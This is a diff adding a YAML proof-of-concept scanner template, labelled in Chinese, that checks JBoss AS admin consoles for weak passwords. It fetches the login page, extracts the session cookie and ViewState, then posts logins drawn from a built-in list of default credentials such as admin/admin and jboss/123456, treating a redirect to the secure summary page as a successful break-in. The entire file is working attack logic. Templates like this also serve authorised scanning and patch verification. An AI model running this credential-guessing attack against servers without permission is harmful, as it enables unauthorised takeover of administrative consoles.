@@ -1,0 +1,46 @@
+id: poc-yaml-jboss-as-admin-console-weak-pass
+info:
+  name: JBoss 管理后台弱口令
+  severity: high
+  tags:
+  - 弱口令
+  finger: JBoss
+variables:
+  users: 'admin
+
+    jboss'
+  password: 'admin
+
+    jboss
+
+    123456
+
+    password1!
+
+    ezoffice
+
+    Admin123
+
+    Admin12345
+
+    vulhub'
+requests:
+- method: GET
+  path: /admin-console/login.seam
+  expression: 'status_code == 200 && contains(body,"Please login")
+
+    '
+  output:
+  - regex_match(headers,"JSESSIONID=(?P<JSESSIONID>.*?);")
+  - regex_match(body,`<input type="hidden" name="javax\.faces\.ViewState" id="javax\.faces\.ViewState"
+    value="(?P<viewstate>.*?)".*?/>`)
+- method: POST
+  path: /admin-console/login.seam
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    Cookie: JSESSIONID={{.JSESSIONID}}
+  data: login_form=login_form&login_form%3Aname={{.users}}&login_form%3Apassword={{.password}}&login_form%3Asubmit=Login&javax.faces.ViewState={{.viewstate}}
+  expression: 'status_code == 302 && contains(headers,"/admin-console/secure/summary.seam")
+
+    '
+transport: http
